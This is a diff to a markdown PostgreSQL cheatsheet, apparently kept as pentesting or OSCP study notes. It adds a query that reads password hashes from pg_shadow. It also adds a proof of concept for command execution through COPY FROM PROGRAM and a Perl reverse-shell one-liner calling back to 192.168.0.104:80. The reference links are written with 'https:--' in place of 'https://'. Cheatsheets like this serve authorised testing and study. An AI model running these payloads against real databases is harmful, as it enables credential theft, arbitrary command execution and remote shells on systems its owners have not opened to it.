@@ -1,28 +1,49 @@
 # PostgreSQL Cheatsheet
 
-**Warning part of this article were created with ChatGTP 3.5 consulting the [PostgreSQL Documentation](https://www.postgresql.org/docs/)** 
+**Warning part of this article were created with ChatGTP 3.5 consulting the [PostgreSQL Documentation](https:--www.postgresql.org/docs/)**
 
-Connect
-```bash
-psql -h $ipAddress -p 5432 -U postgres
-```
-
-Basic Commands and tricks
 ```sql
--- Get Help
-\?
+psql
+psql -h <LHOST> -U <USERNAME> -c "<COMMAND>;"
+psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
+psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
 
--- List databases
-\l
--- Connect to database
-\c
--- Show all tables in database
-\dt
-\dt+ -- show size and description
-
--- Case insensitive
-select * from $tableName
+postgres=# \? -- Get Help
+postgres=# \list                     -- list all databases
+postgres=# \l                        -- Shortform List databases 
+postgres=# \c                        -- use database
+postgres=# \c <DATABASE>             -- use specific database
+postgres=# \s                        -- command history
+postgres=# \q                        -- quit
+<DATABASE>=# \dt                     -- list tables from current schema
+<DATABASE>=# \dt *.*                 -- list tables from all schema
+<DATABASE>=# \dt+ -- show size and description
+<DATABASE>=# \du                     -- list users roles
+<DATABASE>=# \du+                    -- list users roles
+<DATABASE>=# SELECT user;            -- get current user
+<DATABASE>=# TABLE <TABLE>;          -- select table
+<DATABASE>=# SELECT * FROM users;    -- select everything from users table
+<DATABASE>=# SHOW rds.extensions;    -- list installed extensions
+<DATABASE>=# SELECT usename, passwd from pg_shadow;    -- read credentials
+<DATABASE>=# select * from TabLeNameHeRE -- Case insensitive
 ```
+
+[HackTricks](https:--book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#rce) states that *"Since [version 9.3](https:--www.postgresql.org/docs/9.3/release-9-3.html) only **super users** and member of the group `**pg_execute_server_program**` can use copy for RCE.
+
+```sql
+#PoC
+DROP TABLE IF EXISTS cmd_exec;
+CREATE TABLE cmd_exec(cmd_output text);
+COPY cmd_exec FROM PROGRAM 'id';
+SELECT * FROM cmd_exec;
+DROP TABLE IF EXISTS cmd_exec;
+
+#Reverse shell
+#Notice that in order to scape a single quote you need to put 2 single quotes
+COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
+```
+
+#### More Administrative Commands
 
 Creating and Managing Databases
 ```sql
@@ -96,5 +117,7 @@ psql -h hostname -d database_name -U username -f backup.sql
 
 ## References
 
-[PostgreSQL Documentation](https://www.postgresql.org/docs/)
-[postgresqltutorial](https://www.postgresqltutorial.com/postgresql-administration/postgresql-show-tables/)
+[PostgreSQL Documentation](https:--www.postgresql.org/docs/)
+[postgresqltutorial](https:--www.postgresqltutorial.com/postgresql-administration/postgresql-show-tables/)
+[0xsyr0](https:--github.com/0xsyr0/OSCP#postgresql) 
+[HackTricks](https:--book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#rce)
